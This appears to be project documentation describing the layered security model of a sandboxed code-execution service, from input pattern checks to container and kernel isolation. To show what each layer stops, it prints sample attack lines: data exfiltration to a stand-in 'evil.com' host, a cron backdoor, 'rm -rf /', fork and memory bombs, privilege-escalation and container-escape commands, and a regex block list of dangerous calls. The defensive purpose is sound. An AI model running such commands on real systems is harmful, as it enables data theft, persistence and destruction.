# 🔐 Security Deep Dive: Protecting Against Malicious Code

This document explains the comprehensive security model that protects our code execution system from attacks.

## 🎯 Security Threat Model

### What We're Protecting Against

When users can submit arbitrary code, we face these threats:

```
🚨 THREAT CATEGORIES:

1. System Compromise
   ├── File system access/destruction
   ├── Process manipulation
   ├── Privilege escalation
   └── Kernel exploits

2. Resource Exhaustion (DoS)
   ├── Infinite loops
   ├── Memory bombs
   ├── Fork bombs
   └── CPU exhaustion

3. Data Exfiltration
   ├── Reading sensitive files
   ├── Network connections
   ├── Environment variables
   └── Container escape

4. Service Abuse
   ├── Rate limit bypass
   ├── Unauthorized access
   ├── Cryptocurrency mining
   └── Botnet participation
```

## 🛡️ Multi-Layer Defense Architecture

Our security uses **Defense in Depth** - multiple independent layers:

```
┌─────────────────────────────────────────────────────────────┐
│                    SECURITY LAYERS                          │
├─────────────────────────────────────────────────────────────┤
│ Layer 7: Application  │ Input validation, pattern detection │
│ Layer 6: Network      │ Rate limiting, CORS, authentication │
│ Layer 5: Container    │ Isolation, no network, capabilities │
│ Layer 4: User         │ Non-root execution, restricted shell│
│ Layer 3: Filesystem   │ Read-only, tmpfs, size limits      │
│ Layer 2: Process      │ PID limits, resource constraints    │
│ Layer 1: Kernel       │ Seccomp, AppArmor, namespaces     │
└─────────────────────────────────────────────────────────────┘
```

## 🔍 Layer 7: Application Security

### Input Validation and Sanitization

**Code Pattern Detection:**
```javascript
// src/middleware/security.js
const dangerousPatterns = [
  // System access
  /\bexec\s*\(/i,
  /\beval\s*\(/i,
  /\bos\.system\s*\(/i,
  /\bsubprocess\s*\./i,

  // File system access
  /\bopen\s*\(/i,
  /\bfile\s*\(/i,
  /\breadlines\s*\(/i,

  // Network access
  /\brequests\s*\./i,
  /\burllib\s*\./i,
  /\bfetch\s*\(/i,
  /\bXMLHttpRequest/i,

  // Infinite loops
  /\bwhile\s*\(\s*true\s*\)/i,
  /\bfor\s*\(\s*;\s*;\s*\)/i,

  // Process creation
  /\brequire\s*\(\s*['"]child_process['"]\s*\)/i,
  /\b__import__\s*\(\s*['"]subprocess['"]\s*\)/i,

  // Dangerous imports
  /\bimport\s+os\b/i,
  /\bfrom\s+os\s+import/i,
];
```

**Why This Matters:**
- **Primary Defense**: Blocks obviously malicious code before execution
- **Performance**: Faster than runtime detection
- **Logging**: Helps identify attack patterns

**Example Attack Blocked:**
```python
# ❌ This would be blocked at input validation
import os
os.system("curl http://evil.com/steal-data")
```

### Request Size Limits

```javascript
// Joi validation schema
const executeSchema = Joi.object({
  code: Joi.string().max(1048576).required(), // 1MB max
  input: Joi.string().max(10240).optional(),  // 10KB max
  language: Joi.string().required(),
  timeout: Joi.number().min(1000).max(30000).optional()
});
```

**Protection Against:**
- **Memory exhaustion** from huge code submissions
- **DoS attacks** with massive payloads
- **Storage attacks** filling up disk space

## 🌐 Layer 6: Network Security

### API Key Authentication

```javascript
// src/middleware/security.js
const authenticateApiKey = (req, res, next) => {
  const apiKey = req.header('X-API-Key') || req.query.apiKey;

  if (!apiKey || apiKey !== process.env.API_KEY) {
    logger.warn('Invalid API key attempt', {
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      providedKey: apiKey?.substring(0, 8) + '...'
    });

    return res.status(401).json({
      success: false,
      error: 'Invalid API key'
    });
  }

  next();
};
```

**Security Features:**
- **Key rotation**: Environment variable allows easy key changes
- **Audit logging**: All failed attempts logged with IP/User-Agent
- **Key masking**: Only first 8 chars logged for debugging

### Rate Limiting

```javascript
// Different limits for different endpoints
const executeRateLimit = createRateLimit(
  5 * 60 * 1000, // 5 minutes window
  20             // 20 executions max
);

const generalRateLimit = createRateLimit(
  15 * 60 * 1000, // 15 minutes window
  100             // 100 requests max
);
```

**Attack Prevention:**
- **DoS protection**: Prevents overwhelming the system
- **Resource abuse**: Stops cryptocurrency mining attempts
- **Cost control**: Limits compute resource consumption

### CORS Configuration

```javascript
app.use(cors({
  origin: process.env.CORS_ORIGIN || [
    'http://localhost:3000',
    'http://localhost:3001'
  ],
  credentials: true
}));
```

**Browser Security:**
- **XSS protection**: Prevents malicious websites from using our API
- **Origin validation**: Only approved domains can call the API
- **Credential handling**: Secure cookie transmission

## 📦 Layer 5: Container Isolation

### Network Isolation

```javascript
NetworkMode: 'none'  // Complete network isolation
```

**What This Blocks:**
```python
# ❌ All of these fail inside the container:
import requests
requests.get("http://evil.com/data")  # No network access

import urllib.request
urllib.request.urlopen("http://example.com")  # Fails

import socket
sock = socket.socket()
sock.connect(("malicious.com", 80))  # Connection refused
```

**Why Complete Isolation:**
- **Data exfiltration**: Can't send sensitive data out
- **Command & control**: Can't receive instructions from attackers
- **Resource abuse**: Can't participate in botnets or mining pools
- **Supply chain attacks**: Can't download malicious dependencies

### Container Filesystem Isolation

```javascript
// Container sees this filesystem:
{
  ReadonlyRootfs: false,  // Need /tmp for compilation
  Tmpfs: {
    '/tmp': 'rw,noexec,nosuid,size=100m',     // Code execution area
    '/var/tmp': 'rw,noexec,nosuid,size=10m'   // Additional temp space
  }
}
```

**Filesystem Layout Inside Container:**
```bash
/                    # Root (read-only except /tmp)
├── bin/            # System binaries (read-only)
├── usr/            # User programs (read-only)
├── lib/            # Libraries (read-only)
├── etc/            # Config files (read-only)
├── tmp/            # User code runs here (read-write, noexec)
│   ├── code.py     # User's submitted code
│   └── program     # Compiled binary (if applicable)
└── ...             # Other system dirs (read-only)
```

**Security Properties:**
- **noexec**: Can't execute files from /tmp (prevents some exploits)
- **nosuid**: SUID bits ignored (prevents privilege escalation)
- **size limits**: Prevents disk space exhaustion
- **isolation**: Can't see host filesystem

## 👤 Layer 4: User Security

### Non-Root Execution

```javascript
User: 'nobody'  // UID 65534, GID 65534
```

**Why "nobody":**
- **Minimal privileges**: Has almost no system permissions
- **Can't install software**: No package manager access
- **Can't modify system**: No write access to system directories
- **Can't access other users' files**: Standard Unix permissions apply

**What "nobody" CAN'T do:**
```bash
# ❌ All of these fail with "Permission denied":
adduser hacker          # Can't create users
sudo anything           # Not in sudoers file
chmod 777 /etc/passwd   # Can't modify system files
mount /dev/sda1 /mnt    # Can't mount filesystems
iptables -F             # Can't modify firewall rules
```

### Capability Dropping

```javascript
CapDrop: ['ALL']  // Remove all Linux capabilities
```

**Capabilities Removed:**
```
Critical Capabilities Dropped:
├── CAP_SYS_ADMIN     (System administration)
├── CAP_NET_ADMIN     (Network configuration)
├── CAP_SYS_TIME      (Change system time)
├── CAP_MKNOD         (Create device files)
├── CAP_SYS_PTRACE    (Debug other processes)
├── CAP_SYS_MODULE    (Load kernel modules)
├── CAP_DAC_OVERRIDE  (Bypass file permissions)
├── CAP_SETUID        (Change user ID)
├── CAP_SETGID        (Change group ID)
└── ... 28 more capabilities
```

**Real-World Impact:**
```python
# ❌ These operations fail due to dropped capabilities:
import os
os.setuid(0)           # Can't become root
os.mknod("/dev/evil")  # Can't create device files
os.system("modprobe malicious_module")  # Can't load kernel modules
```

## 💾 Layer 3: Filesystem Security

### Temporary Filesystem (tmpfs)

```javascript
Tmpfs: {
  '/tmp': 'rw,noexec,nosuid,size=100m'
}
```

**How tmpfs Works:**
- **Memory-based**: Files stored in RAM, not disk
- **Volatile**: Everything deleted when container stops
- **Fast**: No disk I/O, much faster than regular filesystem
- **Isolated**: Each container gets its own tmpfs

**Security Benefits:**
```python
# ❌ These attacks fail on tmpfs:
with open("/tmp/evil_script.sh", "w") as f:
    f.write("#!/bin/sh\nrm -rf /\n")
os.chmod("/tmp/evil_script.sh", 0o755)
os.system("/tmp/evil_script.sh")  # Fails: noexec flag prevents execution
```

### File Size Limits

```javascript
// Tmpfs size limits
'/tmp': 'size=100m'      // Max 100MB for code execution
'/var/tmp': 'size=10m'   // Max 10MB for additional temp files
```

**Protection Against:**
- **Disk space exhaustion**: Can't fill up host disk
- **Memory bombs**: Limited to allocated space
- **Log file attacks**: Can't create huge log files

## ⚡ Layer 2: Process Security

### Process Limits

```javascript
PidsLimit: 64  // Maximum 64 processes per container
```

**Fork Bomb Prevention:**
```python
# ❌ This fork bomb gets stopped:
import os
def fork_bomb():
    while True:
        os.fork()  # After 64 processes, this fails

fork_bomb()  # Process creation eventually fails
```

### Resource Constraints

```javascript
HostConfig: {
  Memory: 134217728,        // 128MB RAM limit
  CpuQuota: 50000,         // 50% CPU limit
  CpuPeriod: 100000,       // 100ms periods

  Ulimits: [
    { Name: 'nofile', Soft: 64, Hard: 64 },   // Max 64 open files
    { Name: 'nproc', Soft: 32, Hard: 32 }     // Max 32 processes per user
  ]
}
```

**Memory Protection:**
```python
# ❌ This memory bomb gets killed:
data = []
while True:
    data.append("A" * 1024 * 1024)  # 1MB per iteration
    # After ~128 iterations, container gets OOM killed
```

**CPU Protection:**
```python
# ❌ This CPU bomb gets throttled:
while True:
    pass  # Infinite loop uses only 50% CPU max, other containers protected
```

## 🔧 Layer 1: Kernel Security

### Security Options

```javascript
SecurityOpt: [
  'no-new-privileges:true'  // Prevents privilege escalation
]
```

**Privilege Escalation Prevention:**
```bash
# ❌ These privilege escalation attempts fail:
sudo su -                    # no-new-privileges blocks this
su root                      # Also blocked
exec "/bin/bash" SUID        # SUID execution prevented
```

### Container Escape Prevention

**Namespace Isolation:**
Docker automatically provides namespace isolation:

```
Host vs Container View:

Host PID Namespace:        Container PID Namespace:
├── PID 1: systemd        ├── PID 1: python code.py
├── PID 1234: docker      ├── PID 2: (nothing else visible)
├── PID 5678: user code   └── (can't see host processes)
└── PID 9999: other app
```

**Container can't see:**
- Host processes
- Other containers
- Host filesystem
- Host network interfaces
- Host users and groups

## 🚨 Attack Scenarios and Defenses

### Scenario 1: System File Access

**Attack Attempt:**
```python
# Attacker tries to read sensitive files
with open("/etc/passwd", "r") as f:
    passwords = f.read()
    print(passwords)
```

**Defense Layers:**
1. **Container isolation**: `/etc/passwd` in container is different from host
2. **Readonly filesystem**: Even container's `/etc/passwd` might be readonly
3. **User permissions**: `nobody` user can't read sensitive files
4. **No network**: Can't exfiltrate data even if readable

**Result:** ✅ Blocked at multiple layers

### Scenario 2: Network Exfiltration

**Attack Attempt:**
```python
import requests
import os

# Try to steal environment variables
env_data = dict(os.environ)
requests.post("http://evil.com/steal", json=env_data)
```

**Defense Layers:**
1. **Input validation**: Might catch `requests` import
2. **Network isolation**: No network access at all
3. **Environment sanitization**: Minimal environment variables in container

**Result:** ✅ Blocked at network layer

### Scenario 3: Resource Exhaustion

**Attack Attempt:**
```python
# Memory bomb
data = []
while True:
    data.append(bytearray(1024 * 1024))  # 1MB allocations

# CPU bomb
while True:
    pass

# Fork bomb
import os
while True:
    os.fork()
```

**Defense Layers:**
1. **Memory limits**: Container killed at 128MB
2. **CPU limits**: Throttled to 50% CPU
3. **Process limits**: Fork fails after 64 processes
4. **Timeout**: Execution stopped after 10-30 seconds

**Result:** ✅ Contained and limited

### Scenario 4: Container Escape

**Attack Attempt:**
```python
# Try various container escape techniques
import os

# Try to access Docker socket
os.system("ls -la /var/run/docker.sock")

# Try to mount host filesystem
os.system("mount /dev/sda1 /mnt")

# Try to access host processes
os.system("cat /proc/1/environ")
```

**Defense Layers:**
1. **No docker socket**: Not mounted in container
2. **Capability dropping**: Can't mount filesystems
3. **PID namespace**: Can't see host processes
4. **Non-root user**: No privileges for dangerous operations

**Result:** ✅ All attempts fail

## 📊 Security Monitoring

### Audit Logging

```javascript
// Security events we log:
logger.warn('Rate limit exceeded', {
  ip: req.ip,
  userAgent: req.get('User-Agent'),
  path: req.path,
  timestamp: new Date().toISOString()
});

logger.warn('Dangerous code detected', {
  ip: req.ip,
  pattern: pattern.toString(),
  requestId: req.id,
  codeSnippet: req.body.code.substring(0, 100)
});

logger.warn('Invalid API key attempt', {
  ip: req.ip,
  providedKey: apiKey.substring(0, 8) + '...',
  userAgent: req.get('User-Agent')
});
```

### Metrics to Monitor

```
Security Metrics:
├── Authentication failures per hour
├── Rate limit violations per IP
├── Pattern detection triggers
├── Container creation failures
├── Memory limit hits
├── CPU throttling events
├── Process limit violations
└── Execution timeouts
```

## 🔧 Security Best Practices

### 1. Keep Images Updated

```bash
# Regular security updates
docker pull python:3.11-alpine
docker pull node:18-alpine
docker pull openjdk:17-alpine

# Check for known vulnerabilities
docker scan python:3.11-alpine
```

### 2. Image Minimization

```dockerfile
# ✅ Good: Minimal Alpine image
FROM python:3.11-alpine
RUN apk add --no-cache gcc musl-dev

# ❌ Bad: Full Ubuntu image with unnecessary tools
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3 vim curl wget git
```

### 3. Secrets Management

```bash
# ✅ Good: Environment variables for secrets
API_KEY=random-256-bit-key-here

# ❌ Bad: Hardcoded in source code
const API_KEY = "secret123";
```

### 4. Regular Security Audits

```bash
# Check for vulnerabilities in dependencies
npm audit

# Scan Docker images
docker scan code-execution-backend:latest

# Review security logs
grep "WARN\|ERROR" logs/security.log
```

## 🎯 Threat Intelligence

### Common Attack Patterns

1. **Cryptocurrency Mining**
   ```python
   # Pattern: CPU intensive operations
   import hashlib
   while True:
       hashlib.sha256(b"mining").hexdigest()
   ```

2. **Data Exfiltration**
   ```python
   # Pattern: File access + network requests
   with open("/etc/hosts", "r") as f:
       data = f.read()
   requests.post("http://evil.com", data=data)
   ```

3. **Persistence Attempts**
   ```python
   # Pattern: Cron jobs, startup scripts
   os.system("echo '* * * * * /tmp/backdoor' | crontab -")
   ```

4. **Privilege Escalation**
   ```python
   # Pattern: User/group manipulation
   os.system("usermod -aG sudo nobody")
   ```

### Emerging Threats

- **AI-Generated Attacks**: Sophisticated evasion techniques
- **Supply Chain**: Malicious packages in pip/npm
- **Zero-Days**: Container runtime vulnerabilities
- **Side-Channel**: Timing attacks, cache probing

This comprehensive security model ensures that even if one layer fails, multiple other layers provide protection against malicious code execution.